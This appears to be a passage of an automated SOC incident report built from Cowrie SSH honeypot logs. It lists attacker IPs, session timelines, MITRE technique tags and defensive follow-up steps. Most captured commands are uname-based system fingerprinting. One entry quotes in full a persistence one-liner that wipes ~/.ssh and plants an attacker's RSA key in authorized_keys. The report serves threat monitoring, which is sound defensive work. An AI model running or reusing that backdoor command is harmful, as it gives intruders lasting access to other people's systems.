- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83ee20397f77

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:31 |
| **Last Seen** | 2026-07-05 04:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:31:15` | `cowrie.session.connect` |
| `2026-07-05 04:31:16` | `cowrie.client.version` |
| `2026-07-05 04:31:16` | `cowrie.client.kex` |
| `2026-07-05 04:31:19` | `cowrie.login.success` |
| `2026-07-05 04:31:20` | `cowrie.session.params` |
| `2026-07-05 04:31:20` | `cowrie.command.input` |
| `2026-07-05 04:31:20` | `cowrie.command.input` |
| `2026-07-05 04:31:20` | `cowrie.command.input` |
| `2026-07-05 04:31:20` | `cowrie.command.input` |
| `2026-07-05 04:31:20` | `cowrie.command.input` |
| `2026-07-05 04:31:20` | `cowrie.command.success` |
| `2026-07-05 04:31:20` | `cowrie.command.input` |
| `2026-07-05 04:31:20` | `cowrie.command.input` |
| `2026-07-05 04:31:20` | `cowrie.command.input` |
| `2026-07-05 04:31:20` | `cowrie.command.input` |
| `2026-07-05 04:31:21` | `cowrie.log.closed` |
| `2026-07-05 04:31:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-776d9a84ad6b

| Field | Detail |
|---|---|
| **Source IP** | `46.101.216[.]224` |
| **First Seen** | 2026-07-05 04:31 |
| **Last Seen** | 2026-07-05 04:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:31:37` | `cowrie.session.connect` |
| `2026-07-05 04:31:37` | `cowrie.client.version` |
| `2026-07-05 04:31:37` | `cowrie.client.kex` |
| `2026-07-05 04:31:38` | `cowrie.login.success` |
| `2026-07-05 04:31:38` | `cowrie.session.params` |
| `2026-07-05 04:31:38` | `cowrie.command.input` |
| `2026-07-05 04:31:38` | `cowrie.command.failed` |
| `2026-07-05 04:31:39` | `cowrie.log.closed` |
| `2026-07-05 04:31:39` | `cowrie.session.params` |
| `2026-07-05 04:31:39` | `cowrie.command.input` |
| `2026-07-05 04:31:40` | `cowrie.session.file_download` |
| `2026-07-05 04:31:40` | `cowrie.log.closed` |
| `2026-07-05 04:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.216[.]224` to AbuseIPDB if not already reported
- [ ] Block `46.101.216[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8df069c797dd

| Field | Detail |
|---|---|
| **Source IP** | `46.101.216[.]224` |
| **First Seen** | 2026-07-05 04:31 |
| **Last Seen** | 2026-07-05 04:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:31:40` | `cowrie.session.connect` |
| `2026-07-05 04:31:40` | `cowrie.client.version` |
| `2026-07-05 04:31:40` | `cowrie.client.kex` |
| `2026-07-05 04:31:40` | `cowrie.login.success` |
| `2026-07-05 04:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.216[.]224` to AbuseIPDB if not already reported
- [ ] Block `46.101.216[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-233ff8cdcd9d

| Field | Detail |
|---|---|
| **Source IP** | `46.101.216[.]224` |
| **First Seen** | 2026-07-05 04:31 |
| **Last Seen** | 2026-07-05 04:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:31:40` | `cowrie.session.connect` |
| `2026-07-05 04:31:40` | `cowrie.client.version` |
| `2026-07-05 04:31:40` | `cowrie.client.kex` |
| `2026-07-05 04:31:41` | `cowrie.login.success` |
| `2026-07-05 04:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.216[.]224` to AbuseIPDB if not already reported
- [ ] Block `46.101.216[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a60f5784907b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:32 |
| **Last Seen** | 2026-07-05 04:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:32:40` | `cowrie.session.connect` |
| `2026-07-05 04:32:41` | `cowrie.client.version` |
| `2026-07-05 04:32:41` | `cowrie.client.kex` |
| `2026-07-05 04:32:45` | `cowrie.login.success` |
| `2026-07-05 04:32:49` | `cowrie.session.params` |
| `2026-07-05 04:32:49` | `cowrie.command.input` |
| `2026-07-05 04:32:49` | `cowrie.command.input` |
| `2026-07-05 04:32:49` | `cowrie.command.input` |
| `2026-07-05 04:32:49` | `cowrie.command.input` |
| `2026-07-05 04:32:49` | `cowrie.command.input` |
| `2026-07-05 04:32:49` | `cowrie.command.success` |
| `2026-07-05 04:32:49` | `cowrie.command.input` |
| `2026-07-05 04:32:49` | `cowrie.command.input` |
| `2026-07-05 04:32:49` | `cowrie.command.input` |
| `2026-07-05 04:32:49` | `cowrie.command.input` |
| `2026-07-05 04:32:50` | `cowrie.log.closed` |
| `2026-07-05 04:32:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a576efefd63f

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-05 04:33 |
| **Last Seen** | 2026-07-05 04:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:33:03` | `cowrie.session.connect` |
| `2026-07-05 04:33:03` | `cowrie.client.version` |
| `2026-07-05 04:33:03` | `cowrie.client.kex` |
| `2026-07-05 04:33:04` | `cowrie.login.success` |
| `2026-07-05 04:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6d027b70355

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-05 04:33 |
| **Last Seen** | 2026-07-05 04:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:33:04` | `cowrie.session.connect` |
| `2026-07-05 04:33:04` | `cowrie.client.version` |
| `2026-07-05 04:33:04` | `cowrie.client.kex` |
| `2026-07-05 04:33:05` | `cowrie.login.success` |
| `2026-07-05 04:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4e5199757f5

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-05 04:33 |
| **Last Seen** | 2026-07-05 04:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:33:05` | `cowrie.session.connect` |
| `2026-07-05 04:33:05` | `cowrie.client.version` |
| `2026-07-05 04:33:06` | `cowrie.client.kex` |
| `2026-07-05 04:33:06` | `cowrie.login.success` |
| `2026-07-05 04:33:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-435e5b0c1b3a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-05 04:33 |
| **Last Seen** | 2026-07-05 04:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:33:06` | `cowrie.session.connect` |
| `2026-07-05 04:33:06` | `cowrie.client.version` |
| `2026-07-05 04:33:07` | `cowrie.client.kex` |
| `2026-07-05 04:33:07` | `cowrie.login.success` |
| `2026-07-05 04:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55178106d2d6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:34 |
| **Last Seen** | 2026-07-05 04:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:34:05` | `cowrie.session.connect` |
| `2026-07-05 04:34:06` | `cowrie.client.version` |
| `2026-07-05 04:34:06` | `cowrie.client.kex` |
| `2026-07-05 04:34:09` | `cowrie.login.success` |
| `2026-07-05 04:34:11` | `cowrie.session.params` |
| `2026-07-05 04:34:11` | `cowrie.command.input` |
| `2026-07-05 04:34:11` | `cowrie.command.input` |
| `2026-07-05 04:34:11` | `cowrie.command.input` |
| `2026-07-05 04:34:11` | `cowrie.command.input` |
| `2026-07-05 04:34:11` | `cowrie.command.input` |
| `2026-07-05 04:34:11` | `cowrie.command.success` |
| `2026-07-05 04:34:11` | `cowrie.command.input` |
| `2026-07-05 04:34:11` | `cowrie.command.input` |
| `2026-07-05 04:34:11` | `cowrie.command.input` |
| `2026-07-05 04:34:11` | `cowrie.command.input` |
| `2026-07-05 04:34:12` | `cowrie.log.closed` |
| `2026-07-05 04:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-711446ebd352

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:35 |
| **Last Seen** | 2026-07-05 04:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:35:32` | `cowrie.session.connect` |
| `2026-07-05 04:35:33` | `cowrie.client.version` |
| `2026-07-05 04:35:33` | `cowrie.client.kex` |
| `2026-07-05 04:35:36` | `cowrie.login.success` |
| `2026-07-05 04:35:39` | `cowrie.session.params` |
| `2026-07-05 04:35:39` | `cowrie.command.input` |
| `2026-07-05 04:35:39` | `cowrie.command.input` |
| `2026-07-05 04:35:39` | `cowrie.command.input` |
| `2026-07-05 04:35:39` | `cowrie.command.input` |
| `2026-07-05 04:35:39` | `cowrie.command.input` |
| `2026-07-05 04:35:39` | `cowrie.command.success` |
| `2026-07-05 04:35:39` | `cowrie.command.input` |
| `2026-07-05 04:35:39` | `cowrie.command.input` |
| `2026-07-05 04:35:39` | `cowrie.command.input` |
| `2026-07-05 04:35:39` | `cowrie.command.input` |
| `2026-07-05 04:35:41` | `cowrie.log.closed` |
| `2026-07-05 04:35:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee2eb709bd43

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:36 |
| **Last Seen** | 2026-07-05 04:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:36:59` | `cowrie.session.connect` |
| `2026-07-05 04:37:00` | `cowrie.client.version` |
| `2026-07-05 04:37:00` | `cowrie.client.kex` |
| `2026-07-05 04:37:03` | `cowrie.login.success` |
| `2026-07-05 04:37:04` | `cowrie.session.params` |
| `2026-07-05 04:37:04` | `cowrie.command.input` |
| `2026-07-05 04:37:04` | `cowrie.command.input` |
| `2026-07-05 04:37:04` | `cowrie.command.input` |
| `2026-07-05 04:37:04` | `cowrie.command.input` |
| `2026-07-05 04:37:04` | `cowrie.command.input` |
| `2026-07-05 04:37:04` | `cowrie.command.success` |
| `2026-07-05 04:37:04` | `cowrie.command.input` |
| `2026-07-05 04:37:04` | `cowrie.command.input` |
| `2026-07-05 04:37:04` | `cowrie.command.input` |
| `2026-07-05 04:37:04` | `cowrie.command.input` |
| `2026-07-05 04:37:06` | `cowrie.log.closed` |
| `2026-07-05 04:37:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d0f6993d86e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:38 |
| **Last Seen** | 2026-07-05 04:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:38:27` | `cowrie.session.connect` |
| `2026-07-05 04:38:28` | `cowrie.client.version` |
| `2026-07-05 04:38:28` | `cowrie.client.kex` |
| `2026-07-05 04:38:31` | `cowrie.login.success` |
| `2026-07-05 04:38:32` | `cowrie.session.params` |
| `2026-07-05 04:38:32` | `cowrie.command.input` |
| `2026-07-05 04:38:32` | `cowrie.command.input` |
| `2026-07-05 04:38:32` | `cowrie.command.input` |
| `2026-07-05 04:38:32` | `cowrie.command.input` |
| `2026-07-05 04:38:32` | `cowrie.command.input` |
| `2026-07-05 04:38:32` | `cowrie.command.success` |
| `2026-07-05 04:38:32` | `cowrie.command.input` |
| `2026-07-05 04:38:32` | `cowrie.command.input` |
| `2026-07-05 04:38:32` | `cowrie.command.input` |
| `2026-07-05 04:38:32` | `cowrie.command.input` |
| `2026-07-05 04:38:33` | `cowrie.log.closed` |
| `2026-07-05 04:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1abc113ef191

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:39 |
| **Last Seen** | 2026-07-05 04:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:39:54` | `cowrie.session.connect` |
| `2026-07-05 04:39:54` | `cowrie.client.version` |
| `2026-07-05 04:39:54` | `cowrie.client.kex` |
| `2026-07-05 04:39:57` | `cowrie.login.success` |
| `2026-07-05 04:40:00` | `cowrie.session.params` |
| `2026-07-05 04:40:00` | `cowrie.command.input` |
| `2026-07-05 04:40:00` | `cowrie.command.input` |
| `2026-07-05 04:40:00` | `cowrie.command.input` |
| `2026-07-05 04:40:00` | `cowrie.command.input` |
| `2026-07-05 04:40:00` | `cowrie.command.input` |
| `2026-07-05 04:40:00` | `cowrie.command.success` |
| `2026-07-05 04:40:00` | `cowrie.command.input` |
| `2026-07-05 04:40:00` | `cowrie.command.input` |
| `2026-07-05 04:40:00` | `cowrie.command.input` |
| `2026-07-05 04:40:00` | `cowrie.command.input` |
| `2026-07-05 04:40:02` | `cowrie.log.closed` |
| `2026-07-05 04:40:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee30a4b0ced9

| Field | Detail |
|---|---|
| **Source IP** | `106.74.128[.]226` |
| **First Seen** | 2026-07-05 04:39 |
| **Last Seen** | 2026-07-05 04:40 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:39:57` | `cowrie.session.connect` |
| `2026-07-05 04:39:58` | `cowrie.client.version` |
| `2026-07-05 04:39:58` | `cowrie.client.kex` |
| `2026-07-05 04:40:03` | `cowrie.login.success` |
| `2026-07-05 04:40:07` | `cowrie.session.params` |
| `2026-07-05 04:40:07` | `cowrie.command.input` |
| `2026-07-05 04:40:08` | `cowrie.log.closed` |
| `2026-07-05 04:40:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.74.128[.]226` to AbuseIPDB if not already reported
- [ ] Block `106.74.128[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47ff3439a505

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:41 |
| **Last Seen** | 2026-07-05 04:41 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:41:22` | `cowrie.session.connect` |
| `2026-07-05 04:41:23` | `cowrie.client.version` |
| `2026-07-05 04:41:23` | `cowrie.client.kex` |
| `2026-07-05 04:41:27` | `cowrie.login.success` |
| `2026-07-05 04:41:31` | `cowrie.session.params` |
| `2026-07-05 04:41:31` | `cowrie.command.input` |
| `2026-07-05 04:41:31` | `cowrie.command.input` |
| `2026-07-05 04:41:31` | `cowrie.command.input` |
| `2026-07-05 04:41:31` | `cowrie.command.input` |
| `2026-07-05 04:41:31` | `cowrie.command.input` |
| `2026-07-05 04:41:31` | `cowrie.command.success` |
| `2026-07-05 04:41:31` | `cowrie.command.input` |
| `2026-07-05 04:41:31` | `cowrie.command.input` |
| `2026-07-05 04:41:31` | `cowrie.command.input` |
| `2026-07-05 04:41:31` | `cowrie.command.input` |
| `2026-07-05 04:41:32` | `cowrie.log.closed` |
| `2026-07-05 04:41:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de25113cfd38

| Field | Detail |
|---|---|
| **Source IP** | `216.218.206[.]66` |
| **First Seen** | 2026-07-05 04:41 |
| **Last Seen** | 2026-07-05 04:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:41:26` | `cowrie.session.connect` |
| `2026-07-05 04:41:26` | `cowrie.login.success` |
| `2026-07-05 04:41:27` | `cowrie.session.params` |
| `2026-07-05 04:41:27` | `cowrie.command.input` |
| `2026-07-05 04:41:27` | `cowrie.command.input` |
| `2026-07-05 04:41:27` | `cowrie.command.failed` |
| `2026-07-05 04:41:27` | `cowrie.command.input` |
| `2026-07-05 04:41:27` | `cowrie.command.failed` |
